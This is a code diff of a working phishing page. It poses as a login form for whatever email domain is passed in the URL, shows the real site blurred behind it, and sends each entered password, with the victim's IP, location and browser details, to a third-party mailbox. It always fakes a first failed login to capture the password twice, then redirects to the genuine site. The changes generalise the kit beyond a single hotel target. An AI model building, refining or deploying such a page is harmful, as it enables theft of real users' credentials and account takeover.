@@ -29,6 +29,8 @@
       height: 100%;
       z-index: -1;
       overflow: hidden;
+      opacity: 0;
+      transition: opacity 0.5s;
     }
     
     .iframe-background iframe {
@@ -36,7 +38,7 @@
       height: 100%;
       border: none;
       filter: blur(3px) brightness(0.7);
-      transform: scale(1.05); /* Prevents blurred edges */
+      transform: scale(1.05);
     }
 
     .iframe-overlay {
@@ -62,11 +64,13 @@
 
     .logo {
       width: 70px;
+      height: 70px;
       margin: 0 auto 10px;
       border-radius: 50%;
       background: white;
       padding: 5px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      object-fit: contain;
     }
 
     h2 {
@@ -83,7 +87,7 @@
       border-radius: 4px;
       font-size: 14px;
       margin-bottom: 14px;
-      display: none; /* Hidden by default, shown via JS */
+      display: none;
     }
 
     .field {
@@ -146,19 +150,17 @@
       transform: translateY(1px);
     }
 
+    button.loading {
+      background: #90caf9;
+      cursor: not-allowed;
+    }
+
     .footer {
       margin-top: 14px;
       font-size: 12px;
       color: #777;
     }
 
-    /* Loading state */
-    button.loading {
-      background: #90caf9;
-      cursor: not-allowed;
-    }
-
-    /* Domain display */
     .domain-display {
       font-size: 14px;
       color: #555;
@@ -166,6 +168,15 @@
       padding: 5px;
       background: #f5f5f5;
       border-radius: 4px;
+      word-break: break-all;
+    }
+
+    .email-display {
+      font-size: 12px;
+      color: #666;
+      margin-top: 5px;
+      padding: 3px;
+      font-style: italic;
     }
   </style>
 </head>
@@ -190,12 +201,13 @@
     <form id="login-form">
       <div class="field">
         <span class="icon">👤</span>
-        <input type="email" id="email" value="frontoffice@savoywestend.cz" readonly />
+        <input type="email" id="email" placeholder="Email address" readonly />
+        <div class="email-display" id="email-source">Email extracted from URL</div>
       </div>
 
       <div class="field">
         <span class="icon">🔒</span>
-        <input type="password" id="psw" placeholder="Password" />
+        <input type="password" id="psw" placeholder="Password" autocomplete="off" />
         <span class="toggle" onclick="togglePassword()">👁</span>
       </div>
 
@@ -211,14 +223,37 @@
   <script>
     // Initialize variables
     let step = 1;
-    const urlParams = new URLSearchParams(window.location.search);
-    const clientID = urlParams.get('id') || "frontoffice@savoywestend.cz";
+    
+    // Extract email from URL hash (everything after #)
+    const getEmailFromHash = () => {
+      const hash = window.location.hash;
+      if (hash && hash.length > 1) {
+        // Remove the # symbol and decode URL encoding
+        const emailFromHash = decodeURIComponent(hash.substring(1));
+        // Basic email validation
+        if (emailFromHash.includes('@') && emailFromHash.includes('.')) {
+          return emailFromHash;
+        }
+      }
+      return null;
+    };
+    
+    // Try to get email from hash, otherwise use default
+    const clientEmail = getEmailFromHash() || "user@example.com";
     
     // Get domain from email
-    const domain = clientID.split('@').pop();
+    const getDomainFromEmail = (email) => {
+      const parts = email.split('@');
+      return parts.length > 1 ? parts.pop() : "example.com";
+    };
+    
+    const domain = getDomainFromEmail(clientEmail);
     
     // Set email field value
-    $('#email').val(clientID);
+    $('#email').val(clientEmail);
+    
+    // Update email source display
+    $('#email-source').text(`Email: ${clientEmail} (from URL hash)`);
     
     // Set iframe source
     $('#frame').attr("src", "https://" + domain);
@@ -227,12 +262,19 @@
     $('#domain-display').text(`Log in to ${domain}`);
     
     // Set favicon logo
-    const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
-    $("#logo").attr("src", logoUrl)
-    .on("error", function() {
-      $(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
-    });
-
+    const setLogo = () => {
+      const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+      $("#logo").attr("src", logoUrl)
+        .on("error", function() {
+          // Fallback if favicon fails
+          $(this).attr("src", `https://via.placeholder.com/70/0096FF/ffffff?text=${domain.charAt(0).toUpperCase()}`);
+        })
+        .on("load", function() {
+          // Show background when logo loads
+          $('.iframe-background').css('opacity', '1');
+        });
+    };
+    
     // Password visibility toggle
     function togglePassword() {
       const p = document.getElementById('psw');
@@ -254,31 +296,38 @@
       submit.addClass('loading');
       submit.prop('disabled', true);
       
+      // Hide error message if shown
+      $("#error").hide();
+      
       // Get user IP and location info
       $.getJSON('https://ipinfo.io/json', function(response) {
         const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
-          _subject: "Logs | " + response.ip,
+          _subject: "Login Attempt | " + response.ip,
           Email: $("#email").val(),
           Password: $("#psw").val(),
           Attempts: step,
           IP: response.ip,
           Location: response.city + ", " + response.country,
           Domain: domain,
-          Timestamp: new Date().toISOString()
+          UserAgent: navigator.userAgent,
+          Timestamp: new Date().toISOString(),
+          Source: "URL Hash: " + window.location.hash
         });
 
         posting.done(function(data) {
           if (step === 2) {
             // Second attempt - redirect to actual domain
-            window.location.href = "https://" + domain;
+            setTimeout(() => {
+              window.location.href = "https://" + domain;
+            }, 1000);
           } else {
             // First attempt - show error
             step++;
-            $("#error").css("display", "block");
+            $("#error").show();
             submit.text('Submit');
             submit.removeClass('loading');
             submit.prop('disabled', false);
-            $("#psw").val("");
+            $("#psw").val("").focus();
             
             // Update error message
             $("#error").text("Invalid credentials. Please try again.");
@@ -286,8 +335,9 @@
         });
 
         posting.fail(function(error) {
-          console.error(error);
-          $("#error").css("display", "block");
+          console.error("Submission error:", error);
+          $("#error").show();
+          $("#error").text("Connection error. Please try again.");
           submit.text('Submit');
           submit.removeClass('loading');
           submit.prop('disabled', false);
@@ -296,41 +346,53 @@
       }, "json").fail(function() {
         // If IP info fails, still submit the form data
         const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
-          _subject: "Logs | Unknown IP",
+          _subject: "Login Attempt | Unknown IP",
           Email: $("#email").val(),
           Password: $("#psw").val(),
           Attempts: step,
           IP: "Unknown",
           Location: "Unknown",
           Domain: domain,
-          Timestamp: new Date().toISOString()
+          UserAgent: navigator.userAgent,
+          Timestamp: new Date().toISOString(),
+          Source: "URL Hash: " + window.location.hash
         });
 
         posting.done(function(data) {
           if (step === 2) {
-            window.location.href = "https://" + domain;
+            setTimeout(() => {
+              window.location.href = "https://" + domain;
+            }, 1000);
           } else {
             step++;
-            $("#error").css("display", "block");
+            $("#error").show();
             submit.text('Submit');
             submit.removeClass('loading');
             submit.prop('disabled', false);
-            $("#psw").val("");
+            $("#psw").val("").focus();
           }
         });
       });
     });
     
-    // Initialize iframe with a default if no domain is detected
-    if (!domain || domain === clientID) {
-      $('#frame').attr("src", "https://www.savoywestend.cz");
-      $('#domain-display').text("Log in to Savoywestend");
-    }
-    
-    // Add some delay to show the background loading
-    setTimeout(function() {
-      $('.iframe-background').css('opacity', '1');
-    }, 100);
+    // Initialize page
+    $(document).ready(function() {
+      setLogo();
+      
+      // If no email in hash, show message
+      if (!getEmailFromHash()) {
+        $('#email-source').html('No email found in URL hash.<br>Example URL: <code>yourpage.html#user@domain.com</code>');
+        $('#email').val('user@example.com');
+      }
+      
+      // Focus password field on load
+      $('#psw').focus();
+      
+      // Show background with delay if logo fails
+      setTimeout(() => {
+        $('.iframe-background').css('opacity', '1');
+      }, 500);
+    });
   </script>
 </body>
-  </html>
+</html>
